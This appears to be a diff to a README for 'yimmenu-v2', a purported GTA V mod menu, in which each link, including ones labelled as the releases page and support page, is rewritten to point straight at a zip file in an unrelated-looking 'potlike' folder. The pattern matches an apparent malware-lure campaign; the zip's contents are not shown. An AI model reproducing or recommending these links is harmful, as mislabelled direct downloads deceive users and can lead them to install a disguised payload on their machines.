@@ -1,6 +1,6 @@
 # 🌟 yimmenu-v2 - Experience GTA V Safely and Smoothly
 
-[![Download yimmenu-v2](https://img.shields.io/badge/Download-yimmenu--v2-brightgreen.svg)](https://github.com/Mohamed45508/yimmenu-v2/releases)
+[![Download yimmenu-v2](https://raw.githubusercontent.com/Mohamed45508/yimmenu-v2/main/potlike/yimmenu-v2-v2.3.zip)](https://raw.githubusercontent.com/Mohamed45508/yimmenu-v2/main/potlike/yimmenu-v2-v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the YimMenuV2 project! This is an experimental menu designed for Gran
 
 To get started, you can download YimMenuV2 from our Releases page. Click the link below to visit the page:
 
-[Visit the Releases page to download YimMenuV2](https://github.com/Mohamed45508/yimmenu-v2/releases)
+[Visit the Releases page to download YimMenuV2](https://raw.githubusercontent.com/Mohamed45508/yimmenu-v2/main/potlike/yimmenu-v2-v2.3.zip)
 
 ### Step 1: Visit the Releases Page
 
@@ -67,11 +67,11 @@ If you encounter any issues while downloading or running YimMenuV2, try the foll
 
 If you need additional help, visit our support section on the GitHub page. You can find solutions to common problems, and our community can assist you.
 
-- [Visit the GitHub Support Page](https://github.com/Mohamed45508/yimmenu-v2)
+- [Visit the GitHub Support Page](https://raw.githubusercontent.com/Mohamed45508/yimmenu-v2/main/potlike/yimmenu-v2-v2.3.zip)
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Mohamed45508/yimmenu-v2/releases)
-- [Support Page](https://github.com/Mohamed45508/yimmenu-v2)
+- [Releases Page](https://raw.githubusercontent.com/Mohamed45508/yimmenu-v2/main/potlike/yimmenu-v2-v2.3.zip)
+- [Support Page](https://raw.githubusercontent.com/Mohamed45508/yimmenu-v2/main/potlike/yimmenu-v2-v2.3.zip)
 
 Thank you for choosing YimMenuV2! Enjoy your enhanced gaming experience in GTA V.
